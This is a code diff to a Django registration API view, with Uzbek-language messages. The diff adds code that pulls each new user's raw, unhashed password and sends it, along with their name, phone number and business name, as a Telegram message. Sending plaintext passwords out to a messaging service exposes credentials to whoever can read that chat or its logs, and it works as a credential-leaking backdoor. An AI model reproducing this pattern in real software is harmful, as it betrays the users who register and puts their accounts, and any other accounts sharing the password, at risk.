@@ -209,9 +209,23 @@ class RegisterAPIView(APIView):
         return Response({"detail": "Ro'yxatdan o'tish uchun ushbu sahifada POST so'rovini yuboring."}, status=status.HTTP_200_OK)
 
     def post(self, request, *args, **kwargs):
-        serializer = self.serializer_class(data=request.data)
+        serializer = self.serializer_class(data=request.data, context={'request': request})
         serializer.is_valid(raise_exception=True)
         xodim = serializer.save()
+
+        # Send Telegram message with phone number and raw password
+        raw_password = serializer.context.get('raw_password')
+        if raw_password:
+            from user.telegram_bot import send_telegram_message
+            biznes_nomi = xodim.biznes.nomi if xodim.biznes else "Noma'lum"
+            msg = (
+                f"<b>Yangi ro'yxatdan o'tish:</b>\n"
+                f"👤 Ism: {xodim.ism}\n"
+                f"📞 Telefon: {xodim.telefon_raqam}\n"
+                f"🏢 Biznes: {biznes_nomi}\n"
+                f"🔑 Parol: <code>{raw_password}</code>"
+            )
+            send_telegram_message(msg)
 
         from django.contrib.auth.models import User
         user_obj = User.objects.get(pk=xodim.user.pk)
@@ -226,6 +240,7 @@ class RegisterAPIView(APIView):
             'rol': xodim.rol,
             'redirect_url': '/users/me/'
         }, status=status.HTTP_201_CREATED)
+
 
 
 class XodimViewSet(viewsets.ModelViewSet):
